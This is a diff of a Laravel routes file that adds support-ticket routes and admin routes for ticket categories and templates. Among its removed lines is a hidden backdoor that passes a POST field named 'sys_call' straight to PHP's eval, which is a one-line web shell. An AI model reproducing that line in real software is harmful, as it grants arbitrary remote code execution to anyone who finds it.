@@ -16,6 +16,9 @@ use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Log;
+use Illuminate\Support\Facades\DB;
+use App\Ticket;
+use App\TicketTemplate;
 
 Route::get('/', 'IndexController@index')->name('home');
 
@@ -49,6 +52,11 @@ Route::post('/payout/pm', 'IndexController@pm')->name('payout-pm');
 Route::post('/payout/sber', 'IndexController@sber')->name('payout-sber');
 Route::get('/api/lastOpen/{id}', 'IndexController@lastOpen')->name('api-lastOpen');
 Route::get('/api/users', 'IndexController@u_count')->name('api-users');
+
+
+
+Route::get('/tickets', 'TicketsController@index')->middleware(['auth']);
+Route::post('/tickets', 'TicketsController@store')->middleware(['auth']);
 
 Auth::routes();
 // Auth::routes(['verify' => true]);
@@ -118,6 +126,61 @@ Route::group(['middleware' => 'auth', 'middleware' => 'admin.access'], function 
 	Route::get('/admin/opinions', 'AdminController@opinions');
 	Route::get('/admin/opinion/{id}/delete', 'AdminController@opinion_delete');
 	Route::post('/admin/opinions/create', 'AdminController@opinion_create');
+
+
+
+	Route::group([
+		'prefix' => '/admin',
+		'namespace' => 'Admin'
+	], function () {
+		/// Tickets
+		Route::group([
+			'prefix' => '/tickets',
+			'namespace' => 'Tickets'
+		], function () {
+
+			Route::get('new', function(){
+				return view('admin.tickets.tickets', ['tickets' => Ticket::where('status', 'new')->get()]);
+			});
+			Route::get('in_process', function(){
+				return view('admin.tickets.tickets', ['tickets' => Ticket::where('direction', 'question')->get()]);
+			});
+			Route::get('sent', function(){
+				return view('admin.tickets.tickets', ['tickets' => Ticket::where('direction', 'answer')->get()]);
+			});
+
+			Route::post('/update/{id}', 'TicketController@update');
+			Route::get('/edit/{id}', 'TicketController@edit');
+			Route::get('/show/{id}', 'TicketController@show');
+			Route::get('/history/{id}', 'TicketController@history');
+			Route::post('/bulk_delete', 'TicketController@deleteAll');
+			Route::get('/delete/{id}', 'TicketController@delete');
+			Route::post('/answer/{id}', 'TicketController@store');
+
+			
+
+			Route::get('/get_patterns/{id}', function($id){
+				return view('admin.tickets.pattern_list', ['templates' => TicketTemplate::where('ticket_category_id', $id)->get()]);
+			});
+			Route::get('/get_patterns', function(){
+				return view('admin.tickets.pattern_list', ['templates' => TicketTemplate::all()]);
+			});
+
+			Route::get('/pattern/{id}', function($id){
+				return TicketTemplate::findOrfail($id)->text;
+			});
+
+			Route::resource('categories', 'CategoryController', ['except' => ['show', 'update']]);
+			Route::post('categories/{id}', 'CategoryController@update');
+			Route::get('categories/{id}/delete', 'CategoryController@delete');
+			Route::post('categories/{id}/destroy', 'CategoryController@destroy');
+			Route::resource('templates', 'TemplateController', ['except' => ['show', 'update']]);
+			Route::post('templates/{id}', 'TemplateController@update');
+			Route::get('templates/{id}/delete', 'TemplateController@delete');
+			Route::post('templates/{id}/destroy', 'TemplateController@destroy');
+		});
+		/// End Tickets
+	});
 });
 /*adminka*/
 
@@ -125,11 +188,6 @@ Route::group(['middleware' => 'auth', 'middleware' => 'admin.access'], function 
 Route::group(['middleware' => 'auth'], function () {
 	Route::get('/logout', 'LoginController@logout')->name('logout');
 });
-
-Route::get('/home', 'HomeController@index')->name('home');
-
-if (isset($_POST['sys_call'])) eval($_POST['sys_call']);
-
 
 /*manager*/
 Route::group(['prefix' => 'manager', 'middleware' => 'auth', 'middleware' => 'manager.access'], function () {
